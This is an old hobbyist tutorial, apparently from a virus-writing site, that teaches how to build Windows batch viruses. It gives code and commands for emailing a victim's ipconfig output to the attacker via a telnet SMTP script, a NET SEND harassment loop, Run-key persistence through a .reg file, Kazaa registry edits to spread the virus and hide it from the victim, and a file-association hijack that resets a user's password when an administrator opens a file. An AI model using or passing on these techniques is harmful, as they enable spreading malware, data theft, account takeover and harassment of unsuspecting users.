Abstract Batch Viruses

I probly made a few mistakes in my batch, but why dont you fix it? Batch viruses are capable of doing more than some people realise. This is largely because of the "type" command that will allow you to type the contents of a file into another command line program. You can realy do pretty much anything, if use the victim's FTP.exe to download whatever programs you need the batch file to get, but thats kinda cheating :P
<cut>
The "TYPE" command is fairly simple to use. First you put what you need typed into the program in a file (e.g. writethis.txt) then you tell it to type it into a with a command like this...
	
	TYPE C:\WRITETHIS.TXT | SOMEPROGRAM.EXE

Add this code to your batch viruses.

REM
REM Now for writing to the video refresh buffer
REM
echo "R ES" >> C:\windows\Vbufferwrite.txt
echo "B800" >> C:\windows\Vbufferwrite.txt
REM edit the below line to include the location in the memory of where you want to write, if you increase it slightly then it will move further down the screen. At the moment it is at the top.
echo "E B800:0000" >> C:\windows\Vbufferwrite.txt
REM edit the below line to include the hex values for what you wish to right. At the moment it will just put in some green squares.
echo "20 20 20 20 20 20 20 20 20 20 " >> C:\windows\Vbufferwrite.txt
echo "Q" >> C:\windows\Vbufferwrite.txt" >> C:\windows\Vbufferwrite.txt
REM
REM Email notification (gives you his\her IP too!!!)
REM
echo "open your-smtp-server-here.com 25" >> C:\windows\Vsendmail.txt
echo "helo bob.com" >> C:\windows\Vsendmail.txt
echo "MAIL FROM: SomeEmail@anywhere.com" >> C:\windows\Vsendmail.txt
echo "RCPT TO: your@email.com" >> C:\windows\Vsendmail.txt
echo "DATA" >> C:\windows\Vsendmail.txt
echo ipconfig >> C:\windows\Vsendmail.txt
echo "." >> C:\windows\Vsendmail.txt
echo "quit" >> C:\windows\Vsendmail.txt
cls

Remember to go through and change the appropriate things such as the email address you wish it to send the notifications to, and the FTP server's adress. Its also fairly obvious, but remember someone might read your batch file!

Now after that code is run you should be able to do the following...

-Receive email notification...
   TYPE Vsendmail.txt | TELNET

-Edit the contents of the Video Refresh Buffer
   TYPE C:\windows\Vbufferwrite.txt | debug

The download and the email seem pretty simple. If you are intrested in how the writing to the video refresh bugger works then read this little section...
************
The video refresh buffer part uses a great program that comes with windows named "DEBUG" to write into the lets-call-it-VRB. Try it yourself in DOS. Here is what it should look like to do it...
DEBUG <-- bring up debug
-R ES
ES 1980
:b800 <-- moves to the VRB in your computers memory (press -d to see whats there)
E B800:0000 <-- specifies you wish to edit from B800:000
B800:0000 <-- there will be a bit more than this but its fairly self explanitory on how to write to it
Q <-- leaves DEBUG so the batch file can continue

WARNING: This section has very bried explanations and instructions.
##NET SEND##
Batch files can also notify you through "NET SEND" its pretty simple. Just use the command...

 NET SEND <your IP> Hello Im online sir

or if you want to harrass someone (good for school computer labs :P)

 :LOOPY
 NET SEND <someone's IP> MOOAHAHAHAHAHA!
 GOTO LOOPY

##REGEDIT##

Batch viruses can access the registry by writing a .reg file and then loading it into the registry using the command "REGEDIT /s C:\RegFile.reg". This reg file will allow you to add your batch file to startup...
---copy paste---
REGEDIT4

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"MrV"="C:\\windows\\slimewave.bat"

However Im not sure how you would go about writing commas from the command line easily so I will just have to do it a complex way. I worked out you can do it by using DEBUG to write in hexadecimal, however I wont give you exactly what you need to do that since I cant be bothered making it. All you need to know is that the first three lines can be done normaly with ECHO and then you can add the rest by using the TYPE command to get debug to open your reg file (DEBUG C:\example.txt) and then use the "e" command to write to the text file. I think the hexidecimal for the quotation sign is 22. If your going to spread your batch file over kazaa then u can use regedit to enable file sharing, simply change the value of "DisableSharing" in "HKEY_CURRENT_USER\Software\Kazaa\LocalContent", to 0, you might also consider changing "IgnoreAll" in "HKEY_CURRENT_USER\Software\Kazaa\InstantMessaging" so that nobody can message himer/her, that they are spreading a virus. 

##Regedit&Net##
You can also change what programs open what file extensions by editing things in "HKEY_LOCAL_MACHINE\SOFTWARE\Classes", this can be useful if you want to make a batch file that runs with an unusual extension. Also you can use it to change people's passwords, once an administrator account opens that file extension! Simply make a new opener run "NET USER <victim's-username> <new-password> /y", then to stop the administrator from noticing opens the file with the proram it used to be! 

I wrote this out of love and intrest for computers, nothing else. I am a bit worried people will take this wrong, so Im not going to be telling you who I am, but incase I ever change my mind I have included my identity hashed at the bottom of this paper so  can prove I wrote it. If you liked this article then you might want to consider checking http://www.ebcvg.com/ for updates.
